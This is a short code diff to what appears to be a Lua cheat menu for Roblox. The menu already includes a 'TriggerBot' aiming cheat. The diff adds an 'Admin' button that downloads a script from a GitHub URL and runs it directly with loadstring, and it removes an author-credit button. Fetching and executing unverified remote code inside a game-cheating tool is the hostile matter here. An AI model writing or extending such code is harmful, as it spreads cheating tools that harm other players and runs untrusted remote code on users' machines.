@@ -199,6 +199,13 @@ MainTab:CreateButton({
     end,
 })
 
+MainTab:CreateButton({
+    Name = "Admin",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    end,
+})
+
 -- TriggerBot
 MainTab:CreateButton({
     Name = "TriggerBot",
@@ -209,11 +216,6 @@ MainTab:CreateButton({
 
 MainTab:CreateButton({
     Name = "Discord : m1.mz",
-    Callback = function() end,
-})
-
-MainTab:CreateButton({
-    Name = "made by the one and only mizzy",
     Callback = function() end,
 })
 
